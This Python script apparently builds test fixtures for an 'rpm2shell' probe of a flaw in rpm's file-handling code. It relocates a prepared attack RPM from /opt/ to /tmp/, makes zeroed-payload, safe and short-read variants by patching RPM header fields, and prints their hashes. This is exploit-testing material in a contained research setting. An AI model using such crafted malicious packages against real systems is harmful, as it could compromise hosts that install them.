#!/usr/bin/env python3
"""Build path-relocated install fixtures for the rpm2shell fsm-consumer probe.

The shipped fixture names its files under /opt/.  Replacing /opt/ with /tmp/
keeps every header string the same length, so no tag offset changes.  The
package is installed with a private --dbpath and the four /tmp paths are
guarded and removed by the runner; no other filesystem location is touched.
"""
from pathlib import Path
import hashlib
import importlib.util
import stat
import struct

HERE = Path(__file__).resolve().parent
spec = importlib.util.spec_from_file_location("rpm2shell_make_attack", HERE / "make-attack.py")
mk = importlib.util.module_from_spec(spec)
spec.loader.exec_module(mk)

MARKER = b"MISHE-RPM!!"
FILLER = b"A" * 53
OLD_DIR = b"/opt/"
NEW_DIR = b"/tmp/"


def relocate(blob: bytes) -> bytes:
    assert blob.count(OLD_DIR) == 5, "unexpected fixture directory count"
    assert blob.count(b"." + OLD_DIR) == 4, "unexpected cpio name count"
    return blob.replace(OLD_DIR, NEW_DIR)


def symlink_size_offset(blob: bytes) -> int:
    sig_entries, _, _, sig_end = mk.header_at(blob, 96)
    assert mk.REGION_TAG in sig_entries
    main_at = (sig_end + 7) & ~7
    entries, data, _, _ = mk.header_at(blob, main_at)
    mode_type, mode_off, mode_count = entries[1030]
    assert mode_type == mk.TYPE_INT16
    modes = struct.unpack_from(f">{mode_count}h", blob, data + mode_off)
    links = [i for i, mode in enumerate(modes) if stat.S_ISLNK(mode & 0xFFFF)]
    assert len(links) == 1
    size_type, size_off, size_count = entries[5008]
    assert size_type == mk.TYPE_INT64 and size_count == mode_count
    return data + size_off + links[0] * 8


def main() -> int:
    out = HERE / "install"
    out.mkdir(exist_ok=True)

    attack = relocate((HERE / "attack.rpm").read_bytes())
    assert attack.count(MARKER + FILLER) == 1, "expected 64-byte chosen payload"
    (out / "attack-reloc.rpm").write_bytes(attack)

    zero = attack.replace(MARKER + FILLER, MARKER + b"\0" * 53)
    (out / "attack-zero-reloc.rpm").write_bytes(zero)

    safe = relocate((HERE / "safe-newc.rpm").read_bytes())
    (out / "safe-reloc.rpm").write_bytes(safe)

    # Same iterator error (short read) with no wrap and no overflow: the
    # declared symlink size is 64, but only 11 payload bytes are present.
    short = bytearray((HERE / "safe-newc.rpm").read_bytes())
    struct.pack_into(">Q", short, symlink_size_offset(short), 64)
    (out / "short-read-reloc.rpm").write_bytes(relocate(bytes(short)))

    for name in ("attack-reloc.rpm", "attack-zero-reloc.rpm", "safe-reloc.rpm",
                 "short-read-reloc.rpm"):
        digest = hashlib.sha256((out / name).read_bytes()).hexdigest()
        print(f"{name} sha256={digest}")
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
